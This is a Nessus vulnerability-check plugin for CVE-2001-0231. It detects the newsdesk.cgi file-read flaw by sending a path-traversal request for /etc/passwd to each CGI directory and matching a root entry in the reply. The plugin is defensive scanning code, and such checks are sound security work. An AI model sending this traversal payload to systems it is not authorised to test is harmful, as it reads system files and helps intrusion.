#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10586);
 script_bugtraq_id(2172);
 script_version ("$Revision: 1.15 $");
 script_cve_id("CVE-2001-0231");
 

 name["english"] = "news desk";
 name["francais"] = "news desk";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The 'newsdesk.cgi' CGI is installed. This CGI has
a well known security flaw that lets an attacker read arbitrary
files with the privileges of the http daemon (usually root or nobody).

Solution : remove it from /cgi-bin.

Risk factor : High";


 desc["francais"] = "Le cgi 'newsdesk.cgi' est install�. Celui-ci poss�de
un probl�me de s�curit� bien connu qui permet � n'importe qui de faire
lire des fichiers arbitraires au daemon http, avec les privil�ges
de celui-ci (root ou nobody). 

Solution : retirez-le de /cgi-bin.

Facteur de risque : S�rieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of /cgi-bin/newsdesk.cgi";
 summary["francais"] = "V�rifie la pr�sence de /cgi-bin/newsdesk.cgi";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);


foreach dir (cgi_dirs())
{
req = http_get(item:string(dir, "/newsdesk.cgi?t=../../../../../../etc/passwd"),
 		port:port);

r = http_keepalive_send_recv(port:port, data:req);
if ( r == NULL ) exit(0);
if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))	
 	security_hole(port);
}
